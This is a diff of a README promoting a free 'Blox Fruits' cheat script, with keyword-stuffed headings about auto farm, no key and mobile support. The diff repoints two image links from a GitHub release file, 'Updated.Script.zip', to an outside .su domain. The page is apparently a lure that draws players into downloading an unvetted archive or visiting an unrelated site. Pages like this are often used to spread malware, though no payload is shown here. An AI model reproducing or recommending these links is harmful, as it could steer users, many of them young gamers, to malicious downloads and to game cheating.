@@ -1,12 +1,12 @@
 # **Best Blox Fruits Script 2025 – Auto Farm, No Key, Mobile Support, Max Level & Fruit Notifier**
 
 [![maxresdefault](https://github.com/user-attachments/assets/1533af9c-f1ce-4a91-8a8b-0567c2ede6f5)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 Unlock the best Blox Fruits scripts of 2025! Featuring auto farm, no key, fruit notifier, mobile & PC support, auto raid, bounty hunter, and more. Max your level fast and dominate the seas—free and updated regularly.
 
 [![зображення](https://github.com/user-attachments/assets/ca51fcea-601c-4a6b-a06c-b51217c02579)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 # 🌊 Best Blox Fruits Script 2025 – Free, No Key, Auto Farm, Mobile & PC Ready
 
